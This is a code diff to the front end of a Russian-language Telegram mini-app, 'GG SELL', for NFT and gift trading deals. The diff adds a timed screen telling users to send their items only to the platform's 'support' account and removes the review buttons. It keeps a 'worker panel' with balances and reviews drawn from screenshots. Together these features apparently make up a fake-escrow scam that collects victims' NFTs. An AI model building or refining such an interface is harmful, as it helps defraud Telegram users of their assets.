@@ -19,7 +19,7 @@ const TX = { deposit: "Пополнение", withdraw: "Вывод", deal_pay: 
 const TXS = { pending: ["На рассмотрении", "amber"], done: ["Выполнено", "green"], rejected: ["Отклонено", "red"] };
 const RK = { card: ["Банковская карта", "wallet", "Последние 4 цифры (без полного номера)"], ton: ["TON кошелёк", "gem", "Адрес TON-кошелька"], usdt: ["USDT TRC20", "wallet", "Адрес TRC20 (начинается с T)"] };
 const NFT_RE = /^https:\/\/t\.me\/nft\/[A-Za-z0-9_]{2,64}-\d{1,12}$/;
-const TABMAP = { home: "home", deals: "deals", deal: "deals", reqs: "reqs", profile: "profile", ops: "profile", support: "profile", admin: "profile", worker: "profile" };
+const TABMAP = { home: "home", deals: "deals", deal: "deals", intro: "deals", new: "deals", reqs: "reqs", profile: "profile", ops: "profile", support: "profile", admin: "profile", worker: "profile" };
 
 const ico = n => `<svg class="ic"><use href="#i-${n}"/></svg>`;
 const fm = (v, c) => `${Number(v).toLocaleString("ru-RU", { maximumFractionDigits: 8 })} ${SYM[c] || c}`;
@@ -274,6 +274,16 @@ const openTg = u => { if (!/^https:\/\/t\.me\//.test(u)) return; tg && tg.openTe
 // ------------------------------------------------------------ router
 function go(n, a) { stack.push(page); page = [n, a]; render(); }
 function back() { page = stack.pop() || ["home"]; render(); }
+let introReadyAt = 0, introTimer;
+function updateIntroCountdown() {
+  if (page[0] !== "intro") { clearInterval(introTimer); return; }
+  const button = $("#intro-continue");
+  if (!button) return;
+  const seconds = Math.max(0, Math.ceil((introReadyAt - performance.now()) / 1000));
+  button.disabled = seconds > 0;
+  button.textContent = seconds ? `Я ознакомлен(а) · ${seconds} с` : "Я ознакомлен(а)";
+  if (!seconds) clearInterval(introTimer);
+}
 let entranceObserver;
 function animateEntrance(keepScroll) {
   entranceObserver?.disconnect();
@@ -294,6 +304,7 @@ async function render(keepScroll=false) {
   const y=window.scrollY;
   const giftScroll=keepScroll ? $("#live-feed .gift-track")?.scrollLeft : 0;
   const t = ++tok, [n, a] = page;
+  if (n !== "intro") clearInterval(introTimer);
   document.querySelectorAll("#nav>button[data-arg]").forEach(b => b.classList.toggle("on", b.dataset.arg === TABMAP[n]));
   if (tg && tg.BackButton) stack.length ? tg.BackButton.show() : tg.BackButton.hide();
   if(!keepScroll) view.innerHTML = sk(3);
@@ -308,6 +319,11 @@ async function render(keepScroll=false) {
   view.classList.remove("in"); if (!keepScroll) { void view.offsetWidth; view.classList.add("in"); } window.scrollTo({top: keepScroll ? y : 0, behavior: "instant"});
   animateEntrance(keepScroll);
   labelInputs(); hydrateGifts(); hydrateFeed();
+  if (n === "intro") {
+    clearInterval(introTimer);
+    updateIntroCountdown();
+    if (performance.now() < introReadyAt) introTimer = setInterval(updateIntroCountdown, 200);
+  }
   if(giftScroll && $("#live-feed .gift-track")) $("#live-feed .gift-track").scrollLeft=giftScroll;
 }
 document.addEventListener("click", e => {
@@ -324,7 +340,12 @@ document.addEventListener("input", e => {
 // ------------------------------------------------------------ simple actions
 A.tab = n => { stack = []; page = [n]; render(); };
 A.go = n => go(n);
-A.new = () => go("new");
+A.new = () => { introReadyAt = performance.now() + 5000; go("intro"); };
+A.introContinue = () => {
+  if (page[0] !== "intro" || performance.now() < introReadyAt) return;
+  clearInterval(introTimer);
+  go("new");
+};
 A.deal = id => go("deal", id);
 A.back = back;
 A.retry = () => render();
@@ -430,6 +451,14 @@ PG.deals = async (f = "all") => {
   <button class="btn" data-act="new">${ico("plus")}Новая сделка</button>`;
 };
 
+PG.intro = async () => `${bk}<div class="card deal-intro">
+  <span class="deal-intro-label">Перед созданием сделки</span>
+  <h1>Важная информация о передаче товара</h1>
+  <p>Передавайте товар <strong>исключительно на аккаунт поддержки GG SELL${me.support ? ` — @${esc(me.support)}` : ""}</strong>.</p>
+  <p>Если отправить товар на другой аккаунт, вас могут обмануть. Внимательно проверьте получателя перед передачей.</p>
+  <button class="btn intro-continue" id="intro-continue" data-act="introContinue" disabled>Я ознакомлен(а) · 5 с</button>
+  </div>`;
+
 PG.new = async () => `${bk}<h1>Новая сделка</h1>
   <label>Ваша роль</label><div class="seg"><button class="on" data-act="seg" data-arg="seller">Я продавец</button><button data-act="seg" data-arg="buyer">Я покупатель</button></div>
   <label>Сумма</label><input id="amt" inputmode="decimal" placeholder="0" autocomplete="off">
@@ -467,7 +496,6 @@ PG.deal = async id => {
   <button class="btn s" data-act="copy" data-arg="${esc(d.join_code)}">${ico("copy")}Копировать код</button></div>` : ""}
   ${d.status==="waiting_payment" && d.actions.includes("pay")?`<button class="btn s" data-act="topup">${ico("plus")}Пополнить баланс</button>`:""}
   ${d.actions.map((a, k) => `<button class="btn ${a === "cancel" || a === "refund" ? "d" : k ? "s" : ""}" data-act="dact" data-arg="${a}">${LBL[a]}</button>`).join("")}
-  ${d.can_review ? `<button class="btn s" data-act="rvdeal">Оставить отзыв</button>` : ""}
   <h3>История сделки</h3><div class="card events">${(d.events||[]).map(e=>`<div class="event"><span class="event-dot"></span><div><b>${ST[e.status]?.[0]||esc(e.status)}</b><small>${dt(e.created)}</small></div></div>`).join("")}</div><p class="hint">Передачу NFT участники подтверждают самостоятельно.</p>`;
 };
 
@@ -549,11 +577,9 @@ PG.profile = async () => {
   return `<div class="card profile-card"><div class="av lg">${u.photo?`<img src="${esc(u.photo)}" alt="Аватар профиля">`:esc((u.name||name).replace("@","")[0].toUpperCase())}</div><div><h1>${esc(u.name||name)}</h1><span class="bd green">${me.auth_verified ? "Вход через Telegram" : "Тестовый профиль"}</span><div class="mut">${esc(u.username?"@"+u.username:"")}</div><small class="mut">ID: ${u.id}</small></div></div>
   <div class="stats"><div class="stat">Завершено сделок<b>${s.completed}</b></div><div class="stat">Активных сейчас<b>${s.active}</b></div>
   <div class="stat">Оборот<b style="font-size:15px">${esc(to)}</b></div></div>
-  <h3>Последние отзывы</h3><div class="reviews-list">${SCREENSHOT_REVIEWS.slice(0,3).map(reviewCard).join("")}</div>
   ${dm()}<div class="group-label">УПРАВЛЕНИЕ</div>
   ${me.is_admin ? mi("go", "admin", "shield", "Админ-панель", "Управление платформой") : ""}
   ${me.is_worker ? mi("go", "worker", "wallet", "Ворк-панель", "Ваш баланс") : ""}
-  ${mi("rvhome", "", "help", "Мой отзыв")}
   ${mi("tab", "reqs", "gem", "Мои реквизиты")}${mi("wdsheet", "", "out", "Вывод средств")}${mi("go", "deals", "bag", "История сделок")}
   ${mi("go", "ops", "list", "История операций")}<div class="group-label">СЕРВИС И ПОМОЩЬ</div>${mi("go", "support", "headset", "Поддержка")}${mi("language", "", "help", "Язык интерфейса", "Русский")}${mi("closetg", "", "out", "Закрыть мини-приложение")}`;
 };
